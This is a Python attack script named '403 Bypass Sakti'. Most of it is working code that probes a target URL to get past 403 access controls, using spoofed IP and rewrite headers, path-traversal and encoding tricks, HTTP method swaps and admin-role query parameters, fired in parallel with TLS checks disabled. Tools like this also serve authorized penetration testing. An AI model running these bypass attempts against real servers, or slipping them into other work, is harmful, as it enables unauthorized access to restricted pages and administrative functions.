#!/usr/bin/env python3
import requests
import argparse
import sys
import concurrent.futures
from urllib.parse import urlparse, quote

BANNER = """                                    
 ___ ___ ___    _                       
| | |   |_  |  | |_ _ _ ___ ___ ___ ___ 
|_  | | |_  |  | . | | | . | .'|_ -|_ -|
  |_|___|___|  |___|_  |  _|__,|___|___|
                   |___|_|              
       Develop By Bangyog
"""

HEADERS_BYPASS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "0.0.0.0"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Real-IP": "localhost"},
    {"X-Real-IP": "0.0.0.0"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Client-IP": "localhost"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Original-URL": "/"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1, localhost"},
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Scheme": "https"},
    {"X-Forwarded-Scheme": "http"},
    {"X-Url-Scheme": "https"},
    {"X-Url-Scheme": "http"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method-Override": "POST"},
    {"X-HTTP-Method-Override": "PUT"},
    {"Content-Type": "application/x-www-form-urlencoded"},
]

PATH_BYPASS = [
    "..;/",
    "..;/..;/",
    "%2e/",
    "%2e%2e/",
    "//",
    "/./",
    "/%2e/",
    "/%2e%2e/",
    "/%2e;",
    "/..;/",
    "/%2e%2e%2f",
    "/%23/",
    "/%2e%2e%2f",
    "/;/",
    "/.;/",
    "/..%00/",
    "/%00/",
    "/%20",
    "/%09",
    "/%0a",
    "/%0d",
    "/.hidden/",
    "/../",
    "/..%252f/",
    "/%2f/",
    "/*",
    "?.js",
    ".json",
    "?",
    "%3f",
    "?%23",
    "?%2f",
]

METHOD_BYPASS = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH", "HEAD", "CONNECT", "TRACE"]

PAYLOADS = [
    ("/", None),
    ("/?_=1", None),
    ("/?id=1", None),
    ("/?admin=1", None),
    ("/?user=admin", None),
    ("/?role=admin", None),
    ("/?access=admin", None),
    ("/%23", None),
    ("/%23/", None),
    ("/..;/..;//", None),
    ("/..;/..;//..;/", None),
]

def parse_args():
    parser = argparse.ArgumentParser(description="403 Bypass Sakti - Tools Bypass 403 Forbidden")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com/admin)")
    parser.add_argument("-p", "--proxy", help="Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-t", "--threads", type=int, default=30, help="Threads (default: 30)")
    parser.add_argument("--timeout", type=int, default=5, help="Timeout per request (default: 5)")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--headers", help="Additional headers (key:value,key2:value2)")
    parser.add_argument("--all", action="store_true", help="Run all bypass techniques")
    parser.add_argument("--headers-only", action="store_true", help="Only test header bypass")
    parser.add_argument("--path-only", action="store_true", help="Only test path bypass")
    parser.add_argument("--method-only", action="store_true", help="Only test HTTP method bypass")
    parser.add_argument("--payload-only", action="store_true", help="Only test payload bypass")
    return parser.parse_args()

def parse_custom_headers(h):
    if not h:
        return {}
    result = {}
    for pair in h.split(","):
        if ":" in pair:
            k, v = pair.split(":", 1)
            result[k.strip()] = v.strip()
    return result

def request_url(url, method="GET", headers=None, cookies=None, timeout=5, proxy=None):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = requests.request(method, url, headers=headers or {}, cookies=cookies or {},
                             timeout=timeout, proxies=proxies, verify=False, allow_redirects=False)
        return r.status_code, len(r.content), r.headers.get("Content-Type", "")
    except Exception as e:
        return None, 0, str(e)

def test_payload(url, method, extra_headers, cookies, orig_len, timeout, proxy, desc):
    status, length, ctype = request_url(url, method, extra_headers, cookies, timeout, proxy)
    if status == 200:
        return (status, length, desc, url, method)
    return None

def main():
    print(BANNER)

    args = parse_args()
    requests.packages.urllib3.disable_warnings()

    target = args.url.rstrip("/")
    proxy = args.proxy
    timeout = args.timeout
    threads = args.threads
    cookies = {}
    if args.cookie:
        for part in args.cookie.split(";"):
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k.strip()] = v.strip()

    custom_headers = parse_custom_headers(args.headers)

    print(f"[*] Target: {target}")
    print(f"[*] Proxy: {proxy or 'None'}")
    print(f"[*] Threads: {threads}")
    print("-" * 60)

    # Get baseline
    print(f"[*] Getting baseline response...")
    base_status, base_len, _ = request_url(target, "GET", custom_headers, cookies, timeout, proxy)
    print(f"[*] Baseline: {base_status} ({base_len} bytes)")
    print("-" * 60)

    if base_status != 403:
        print("[!] Target is NOT returning 403. Proceeding anyway...\n")

    results = []

    run_all = args.all or not (args.headers_only or args.path_only or args.method_only or args.payload_only)

    tasks = []

    if run_all or args.headers_only:
        print("[*] Testing Header Bypass...")
        for h in HEADERS_BYPASS:
            merged = {**custom_headers, **h}
            desc = f"Header: {list(h.keys())[0]}: {list(h.values())[0]}"
            tasks.append((target, "GET", merged, cookies, base_len, timeout, proxy, desc))

    if run_all or args.path_only:
        print("[*] Testing Path Bypass...")
        for p in PATH_BYPASS:
            parsed = urlparse(target)
            base = f"{parsed.scheme}://{parsed.netloc}"
            path = parsed.path
            if path.endswith("/"):
                path = path[:-1]
            url = f"{base}{path}{p}" if not p.startswith("/") and not p.startswith("?") else f"{base}{path}{p}"
            desc = f"Path: {p}"
            tasks.append((url, "GET", custom_headers, cookies, base_len, timeout, proxy, desc))

    if run_all or args.method_only:
        print("[*] Testing Method Bypass...")
        for m in METHOD_BYPASS:
            desc = f"Method: {m}"
            tasks.append((target, m, custom_headers, cookies, base_len, timeout, proxy, desc))

    if run_all or args.payload_only:
        print("[*] Testing Payload Bypass...")
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        orig_path = parsed.path
        for suffix, method in PAYLOADS:
            path = orig_path.rstrip("/") + suffix
            url = f"{base}{path}"
            m = method or "GET"
            desc = f"Payload: {suffix} [{m}]"
            tasks.append((url, m, custom_headers, cookies, base_len, timeout, proxy, desc))

    print("-" * 60)
    print(f"[*] Total tests: {len(tasks)}")
    print("[*] Running...\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(test_payload, *t) for t in tasks]
        for future in concurrent.futures.as_completed(futures):
            r = future.result()
            if r:
                status, length, desc, url, method = r
                results.append(r)
                msg = f"[{status}] {length}B | {desc}"
                if url != target:
                    msg += f"\n      -> {url}"
                print(msg)

    print("\n" + "=" * 60)
    if results:
        print(f"[+] BYPASS FOUND! {len(results)} working technique(s)\n")
        for i, (status, length, desc, url, method) in enumerate(results, 1):
            print(f"  [{i}] {desc}")
            print(f"      Status: {status} | Size: {length}B")
            print(f"      URL: {url}")
            print(f"      Method: {method}")
            if status == 200:
                print(f"      ✅ SAKTI!")
            print()
    else:
        print("[-] No bypass found. Try different techniques.")
    print("=" * 60)

if __name__ == "__main__":
    main()
